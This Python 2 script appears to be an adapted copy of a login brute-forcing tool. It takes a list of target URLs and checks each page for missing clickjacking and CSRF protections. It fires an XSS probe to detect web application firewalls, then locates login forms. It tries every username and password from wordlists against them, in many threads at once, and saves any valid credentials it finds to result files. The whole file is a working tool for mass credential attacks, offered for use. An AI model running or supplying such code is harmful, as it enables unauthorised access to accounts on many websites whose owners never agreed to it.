import requests, os, sys
import mechanize
import cookielib
import warnings
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue
from bs4 import BeautifulSoup
from re import search, findall
from urllib import urlopen
from urllib2 import URLError
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
 
ua = UserAgent()
ua = UserAgent(cache=False)
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
# set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', ua.random),('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),('Accept-Encoding','br')]
# Source : https://github.com/s0md3v/Blazy
 
config = '.session_RESTORE'
 
class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = False
        self.start()
 
    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception, e:
                rootLogger.error(e)
            finally:
                self.tasks.task_done()
 
class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)
 
    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))
 
    def wait_completion(self):
        self.tasks.join()
 
def main(url):
    try:
        try:
            br.open(url, timeout=10.0) #Opens the url
        except URLError as e:
            pass
        forms = br.forms() #Finds all the forms present in webpage
        
        headers = str(urlopen(url).headers.headers).lower() #Fetches headers of webpage
        if 'x-frame-options:' not in headers:
            print '\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability [ %s ]' % url
        if 'cloudflare-nginx' in headers:
            print '\033[1;31m[-]\033[0m Target is protected by Cloudflare [ %s ]' % url
        data = br.open(url).read() #Reads the response
        if 'type="hidden"' not in data:
            print '\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability [ %s ]' % url
        
        soup =  BeautifulSoup(data, 'html.parser',from_encoding="iso-8859-1") #Pareses the response with beuatiful soup
        i_title = soup.find('title') #finds the title tag
        if i_title != None:
            original = i_title.contents #value of title tag is assigned to 'original'
        
        def WAF_detector(): #WAF detection function
            noise = "?=<script>alert()</script>" #a payload which is noisy enough to provoke the WAF
            fuzz = url + noise
            res1 = urlopen(fuzz) #Opens the noise injected payload
            if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
                print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
            elif res1.code == 999: #if the http response code is 999
                print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
            elif res1.code == 419: #if the http response code is 419
                print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
            elif res1.code == 403: #if the http response code is 403
                print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
        WAF_detector()
        
        def wordlist_u(lst): #Loads usernames from usernames.txt
            try:
                with open('lib/usernames.txt','r') as f:
                    for line in f:
                        final = str(line.replace("\n",""))
                        lst.append(final)
            except IOError:
                print "\033[1;31m[-]\033[1;m Wordlist not found!"
                quit()
        def wordlist_p(lst): #Loads passwords from passwords.txt
            try:
                with open('lib/passwords.txt','r') as f:
                    for line in f:
                        final = str(line.replace("\n",""))
                        lst.append(final)
            except IOError:
                print"\033[1;31m[-]\033[1;m Wordlist not found!"
                quit()
        usernames = []
        wordlist_u(usernames)
        print '\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames)
        passwords = []
        wordlist_p(passwords)
        print '\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords)
        def find(): #Function for finding forms
            try:
                form_number = 0
                for f in forms: #Finds all the forms in the webpage
                    data = str(f) #Converts the response recieved to string
                    username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text
            
                    if username: #if such field is found
                        username = (username.group().split('<TextControl(')[1][:-3]) #Extractst the name of field
                        print '\033[1;33m[!]\033[0m Username field: ' + username #prints name of field
                        passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searchs for fields that accept password like text
            
                        if passwd: #if such field is found
                            passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                            print '\033[1;33m[!]\033[0m Password field: ' + passwd #prints name of field
                            select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
             
                            if select_n: #if a menu is found
                                name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
                                select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu
            
                                if select_o: #Proceeds to find options of menu
                                    menu = "True" #Sets the menu to be true
                                    options = (select_o.group().split('=')[1][:-1]) #Extracts options
                                    print '\n\033[1;33m[!]\033[0m A drop down menu detected.'
                                    print '\033[1;33m[!]\033[0m Menu name: ' + name #prints menu name
                                    print '\033[1;33m[!]\033[0m Options available: ' + options #prints available options
                                    with ThreadPoolExecutor(max_workers=1) as executor:
                                        aaaaa = brute(username, passwd, menu, options[0], name, form_number)
                                        task1 = executor.submit(aaaaa)
                                else:
                                    menu = "False" #No menu is present in the form
                                    try:
                                        with ThreadPoolExecutor(max_workers=1) as executor:
                                            bbbbb = brute(username, passwd, menu, option, name, form_number)
                                            task2 = executor.submit(bbbbb)
                                    except Exception as e:
                                        cannotUseBruteForce(username, e)
                                        pass                            
                            else:
                                menu = "False" #No menu is present in the form
                                option = "" #Sets option to null
                                name = "" #Sets name to null
                                try:
                                    brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                                except Exception as e:
                                   cannotUseBruteForce(username, e)
                                   pass
                        else:
                            form_number = form_number + 1
                            pass
                    else:
                        form_number = form_number + 1
                        pass
                print '\033[1;31m[-]\033[0m No forms found at %s' % url
            except Exception as e:
                print('Error: '+e)
            
        def cannotUseBruteForce(username, e):
            print '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s [ %s ]' % (username,url)
            print '\r    [Error: %s]' % e.message    
        def brute(username, passwd, menu, option, name, form_number):
            for uname in usernames:
                progress = 1
                print '\033[1;97m[>]\033[1;m Bruteforcing username: %s  [ %s ]'% (uname, url)
                for password in passwords:
                    sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
                    sys.stdout.flush()
                    br.open(url)  
                    br.select_form(nr=form_number)
                    br.form[username] = uname
                    br.form[passwd] = password
                    if menu == "False":
                        pass
                    elif menu == "True":
                        br.form[name] = [option]
                    else:
                        pass
                    resp = br.submit()
                    data = resp.read()
                    datareal = data
                    data_low = data.lower()
                    if 'or password' in data_low or 'password or' in data_low or 'login failed' in data_low or 'login invalid' in data_low:
                        pass
                    else:
                        soup =  BeautifulSoup(data, 'html.parser',from_encoding="iso-8859-1")
                        i_title = soup.find('title')
                        if i_title == None:
                            if 'logout' in data_low:
                                print '\n\033[1;32m[+]\033[0m Valid credentials found: [ %s ]' % url
                                print uname
                                print password
                                open('RESULT/LOGINSUCCESS_logout.txt', 'a').write(url+"|"+uname+"|"+password+"\n")
                                quit()
                            elif username not in datareal:
                                print '\n\033[1;32m[+]\033[0m Valid credentials found: [ %s ]' % url
                                print uname
                                print password
                                open('RESULT/LOGINSUCCESS_noforms.txt', 'a').write(url+"|"+uname+"|"+password+"\n")
                                quit()
                            else:
                                pass
                        else:
                            injected = i_title.contents
                            if original != injected:
                                if 'window.location.href' in data_low or username in datareal or 'failed' in datareal or 'incorrect' in datareal or 'invalid' in datareal:
                                    pass
                                else:
                                    print '\n\033[1;32m[+]\033[0m Valid credentials found: [ %s ]' % url
                                    print '\033[1;32mUsername: \033[0m' + uname
                                    print '\033[1;32mPassword: \033[0m' + password
                                    open('RESULT/LOGINSUCCESS_redirect.txt', 'a').write(url+"|"+uname+"|"+password+"\n")
                                    quit()
                            else:
                                pass
                    progress = progress + 1
                print ''
            print '\033[1;31m[-]\033[0m Failed to crack login credentials'
        find()
    except Exception as e:
        pass
 
if __name__ == '__main__':
    try:
        mainconfig = ConfigParser()
        mainconfig.read(config)
        lists = mainconfig.get('DB', 'FILES')
        numthread = mainconfig.get('DB', 'THREAD')
        sessi = mainconfig.get('DB', 'SESSION')
        print("LOG Session Exist! Restore Session")
        print('Configuration Details :\n\tList : '+lists+'\n\tThread Number : '+numthread+'\n\tSession :'+sessi)
        tanya = raw_input("Continue Previous Session? [ Y / N ] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            werror
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = sys.argv[1]
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(config, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(config)
    except:
        pass
 
